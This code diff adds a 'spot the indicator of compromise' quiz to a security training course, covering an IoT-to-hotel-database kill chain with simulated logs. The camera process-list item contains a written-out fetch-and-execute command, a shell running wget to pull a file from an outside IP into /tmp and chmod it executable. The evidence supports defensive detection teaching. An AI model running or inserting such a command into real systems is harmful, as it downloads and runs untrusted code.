@@ -1570,6 +1570,19 @@
     .am-predict-fb:empty { margin-bottom: 0; }
     .am-reveal { animation: amRevealIn .25s ease; }
     @keyframes amRevealIn { from { opacity: 0; transform: translateY(4px); } to { opacity: 1; transform: none; } }
+    /* Spot-the-IoC task (Module 8 detect row) — evidence is always dark, like the terminal labs */
+    .am-ioc-caption { font-size: 11px; color: var(--muted); font-weight: 600; margin: 2px 0 6px; }
+    .am-ioc-evidence { display: flex; flex-direction: column; gap: 3px; background: #0a0e14; border: 1px solid var(--border); border-radius: 8px; padding: 8px; overflow-x: auto; margin-bottom: 8px; }
+    .am-ioc-line { display: block; width: 100%; text-align: left; white-space: pre; font-family: 'JetBrains Mono','SF Mono',Menlo,monospace; font-size: 11.5px; line-height: 1.5; color: #c9d6e5; background: transparent; border: 1px solid transparent; border-radius: 5px; padding: 3px 7px; cursor: pointer; transition: background .12s, border-color .12s; }
+    .am-ioc-line:hover:not(:disabled) { background: rgba(37,99,235,.14); border-color: var(--cyan); }
+    .am-ioc-line:disabled { cursor: default; }
+    .am-ioc-line.correct { background: rgba(53,208,127,.16); border-color: var(--green); color: #dff5e8; }
+    .am-ioc-line.wrong { background: rgba(239,68,68,.16); border-color: var(--danger); color: #ffdcdc; }
+    .am-ioc-line.dim { opacity: .4; }
+    .am-ioc-prompt { font-size: 11.5px; color: var(--muted); margin-bottom: 8px; }
+    .am-ioc-fb:not(:empty) { margin-bottom: 8px; }
+    .am-ioc-reveal { animation: amRevealIn .25s ease; }
+    .am-ioc-reveal-label { font-size: 10.5px; font-weight: 700; letter-spacing: .4px; text-transform: uppercase; color: var(--cyan); margin-bottom: 2px; }
 
     /* ===== INTERACTIVE TERMINAL LAB ===== */
     .termlab { margin: 18px 0; border: 1px solid var(--border); border-radius: 12px; overflow: hidden; background: #0a0e14; }
@@ -12965,6 +12978,86 @@ const IOT_PREDICT = [
   },
 ];
 
+// Per-stage "spot the indicator of compromise" tasks for the Module 8 IoT
+// kill chain, index-aligned to IOT_PIVOT_CHAIN.nodes. Each shows a small piece
+// of realistic evidence (auth log, Shodan-style exposure, netstat, flow/IDS,
+// DB audit, firewall egress) with exactly one malicious line among benign
+// noise; `correct` is the 0-based index of that line. Reuses checkAnswer.
+const IOC_TASKS = [
+  {
+    label: 'bms-ctrl auth log — building-management controller (public IP)',
+    lines: [
+      '02:14:07  sshd   Failed password for root from 198.51.100.7',
+      '02:15:02  webui  login OK  user=admin  from 203.0.113.88  [factory default password]',
+      '02:15:44  webui  login OK  user=facilities  from 10.10.20.5',
+      '02:16:10  ntpd   time sync ok  pool.ntp.org',
+    ],
+    correct: 1,
+    prompt: 'Click the one log line that is the indicator of compromise.',
+    hint: 'A failed root attempt is background noise, the facilities login is an internal staff address (10.x), and NTP is routine. Look for a SUCCESSFUL admin login from an outside address — especially one flagged as still on the factory default password.',
+  },
+  {
+    label: 'camera-fw process list — lobby IP camera',
+    lines: [
+      'pid 411  capture_daemon  (video capture)',
+      'pid 415  motion_detect   (motion analytics)',
+      'pid 903  /bin/sh -c "wget http://45.9.148.3/x -O /tmp/.k; chmod +x /tmp/.k"',
+      'pid 120  ntpd            (clock sync)',
+    ],
+    correct: 2,
+    prompt: 'Click the process that is the indicator of compromise.',
+    hint: 'The camera\'s own daemons — capture, motion analytics, clock sync — are expected. Look for a process that has no business on a camera: a shell fetching an unknown file and making it executable.',
+  },
+  {
+    label: 'NDR flow log — one internal host, 8-second window',
+    lines: [
+      'src 192.168.50.11  ->  192.168.50.1:443        1 conn    (device mgmt UI)',
+      'src 192.168.50.11  ->  8.8.8.8:53              2 conn    (dns)',
+      'src 192.168.50.11  ->  192.168.10.0/24 :445,3389,22   254 hosts / 3 ports',
+      'src 192.168.50.20  ->  192.168.10.14:443       4 conn    (pms web ui)',
+    ],
+    correct: 2,
+    prompt: 'Click the flow that is the indicator of compromise.',
+    hint: 'A couple of connections to one service (mgmt UI, DNS, the PMS web UI) is normal. Look for a single IoT host touching hundreds of internal addresses across multiple ports in seconds — a network sweep.',
+  },
+  {
+    label: 'netstat -an on the PMS server (192.168.10.14)',
+    lines: [
+      'TCP  192.168.10.14:445   192.168.10.9:51022    ESTABLISHED  (backup host)',
+      'TCP  192.168.10.14:3389  192.168.50.11:49771   ESTABLISHED  (src: IoT VLAN)',
+      'TCP  192.168.10.14:443   192.168.10.20:50210   ESTABLISHED  (front desk)',
+      'TCP  192.168.10.14:1433  127.0.0.1:5001        LISTEN',
+    ],
+    correct: 1,
+    prompt: 'Click the connection that is the indicator of compromise.',
+    hint: 'Sessions between back-office hosts on the 192.168.10.x subnet, and the local SQL listener, are expected. Look for a remote-desktop session into the PMS that originates from the IoT VLAN (192.168.50.x) — a thermostat should never RDP a server.',
+  },
+  {
+    label: 'PMS database audit log',
+    lines: [
+      'user=app_web    SELECT ... WHERE reservation_id=48120           (1 row)',
+      'user=reporting  SELECT count(*) FROM reservations               (1 row)',
+      'user=svc_iot    SELECT guest_name,passport_no,card_pan FROM guests   (48,213 rows -> export)',
+      'user=app_web    UPDATE rooms SET status=\'clean\' WHERE id=210    (1 row)',
+    ],
+    correct: 2,
+    prompt: 'Click the query that is the indicator of compromise.',
+    hint: 'Single-row look-ups and a nightly count are normal application behavior. Look for an account with no business touching guest data pulling tens of thousands of rows — including passport and card numbers — in one bulk export.',
+  },
+  {
+    label: 'perimeter firewall egress log — PMS segment',
+    lines: [
+      'dst 40.112.72.205:443    HTTPS   2.1 MB    (microsoft 365)',
+      'dst 151.101.0.223:443    HTTPS   512 KB    (content cdn)',
+      'dst 203.0.113.88:8080    1.9 GB outbound, 42-min beacon   [unknown dst]',
+      'dst 17.253.144.10:443    HTTPS   88 KB     (apple push)',
+    ],
+    correct: 2,
+    prompt: 'Click the outbound flow that is the indicator of compromise.',
+    hint: 'Traffic to Microsoft 365, a CDN, and Apple push is routine. Look for a large multi-gigabyte transfer to an unfamiliar external IP with long-lived beaconing — that is the guest database walking out the door.',
+  },
+];
+
 function buildAttackMap(modId) {
   const path = ATTACK_PATHS[modId];
   if (!path) return '';
@@ -12990,7 +13083,13 @@ function buildAttackMap(modId) {
 // The technique + MITRE line + the three content rows (what / detect / defend).
 // Factored out so the predict gate (Module 8) can reveal exactly this content
 // after the learner attempts a prediction, with no change to the other maps.
-function amRowsHtml(n) {
+// For hoteltech-8 the "detect" row becomes an interactive spot-the-IoC task;
+// every other map keeps the plain detection tip (byte-identical to before).
+function amRowsHtml(n, modId, idx) {
+  const iocTask = (modId === 'hoteltech-8' && typeof IOC_TASKS !== 'undefined' && IOC_TASKS[idx]);
+  const detectBody = iocTask
+    ? amIocTaskHtml(n, modId, idx, IOC_TASKS[idx])
+    : `<div class="am-detail-label">How the SOC detects it</div><div class="am-detail-text">${n.detect}</div>`;
   return `
     <div class="am-detail-tech">${n.technique}</div>
     <div class="am-detail-mitre">MITRE ATT&amp;CK ${n.mitre}</div>
@@ -13000,7 +13099,7 @@ function amRowsHtml(n) {
     </div>
     <div class="am-detail-row detect">
       <div class="am-detail-icon"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg></div>
-      <div class="am-detail-body"><div class="am-detail-label">How the SOC detects it</div><div class="am-detail-text">${n.detect}</div></div>
+      <div class="am-detail-body">${detectBody}</div>
     </div>
     <div class="am-detail-row defend">
       <div class="am-detail-icon"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg></div>
@@ -13008,8 +13107,30 @@ function amRowsHtml(n) {
     </div>`;
 }
 
+// The spot-the-IoC task that replaces the plain "How the SOC detects it" tip
+// on the Module 8 map. Shows realistic evidence with one malicious line among
+// benign noise; the learner clicks the indicator of compromise, and only a
+// correct pick reveals the detection explanation (the post-answer reward).
+function amIocTaskHtml(n, modId, idx, t) {
+  const solved = !!amIocSolved[modId + '-' + idx];
+  const lines = t.lines.map(function (ln, i) {
+    const cls = solved ? (i === t.correct ? ' correct' : ' dim') : '';
+    return `<button class="am-ioc-line${cls}"${solved ? ' disabled' : ''} onclick="amIoc('${modId}',${idx},${i})">${ln}</button>`;
+  }).join('');
+  return `
+    <div class="am-detail-label">Spot the indicator of compromise</div>
+    <div class="am-ioc-caption">${t.label}</div>
+    <div class="am-ioc-evidence" id="amIocEv-${modId}-${idx}">${lines}</div>
+    <div class="am-ioc-prompt">${t.prompt || 'Click the one line that is the indicator of compromise.'}</div>
+    <div class="am-ioc-fb" id="amIocFb-${modId}-${idx}">${solved ? checkResultHtml(true, AM_IOC_RIGHT) : ''}</div>
+    <div class="am-ioc-reveal" id="amIocReveal-${modId}-${idx}"${solved ? '' : ' style="display:none"'}>
+      <div class="am-ioc-reveal-label">How the SOC detects it</div>
+      <div class="am-detail-text">${n.detect}</div>
+    </div>`;
+}
+
 function amDetailHtml(n, idx, modId) {
-  const rows = amRowsHtml(n);
+  const rows = amRowsHtml(n, modId, idx);
   // Module 8 (IoT kill chain) only: hide the attacker action and make the
   // learner predict it first; reveal the rows after they answer. Every other
   // attack map falls through to the original all-at-once view unchanged.
@@ -13078,6 +13199,36 @@ function amPredict(modId, idx, choiceIdx) {
     });
   } else if (opts[choiceIdx]) {
     opts[choiceIdx].classList.add('wrong');
+  }
+}
+
+// Spot-the-IoC gate for the Module 8 map. Same shared checkAnswer/feedback
+// pattern: the learner clicks a line of realistic evidence; a wrong pick shows
+// a teaching hint and allows a retry, a correct pick reveals the detection
+// explanation and locks the evidence with the IoC highlighted.
+const AM_IOC_RIGHT = 'Correct — that\'s the indicator of compromise. Here\'s what the SOC watches for at this stage:';
+const amIocSolved = {};
+function amIoc(modId, idx, lineIdx) {
+  const t = (typeof IOC_TASKS !== 'undefined') && IOC_TASKS[idx];
+  if (!t || amIocSolved[modId + '-' + idx]) return;
+  const result = checkAnswer(t.lines[lineIdx], {
+    accept: [t.lines[t.correct]],
+    right: AM_IOC_RIGHT,
+    hint: t.hint,
+  });
+  renderCheckResult(document.getElementById('amIocFb-' + modId + '-' + idx), result);
+  const lines = document.querySelectorAll('#amIocEv-' + modId + '-' + idx + ' .am-ioc-line');
+  if (result.correct) {
+    amIocSolved[modId + '-' + idx] = true;
+    const rev = document.getElementById('amIocReveal-' + modId + '-' + idx);
+    if (rev) rev.style.display = '';
+    lines.forEach(function (b, i) {
+      b.disabled = true;
+      b.classList.remove('wrong');
+      b.classList.add(i === t.correct ? 'correct' : 'dim');
+    });
+  } else if (lines[lineIdx]) {
+    lines[lineIdx].classList.add('wrong');
   }
 }
 
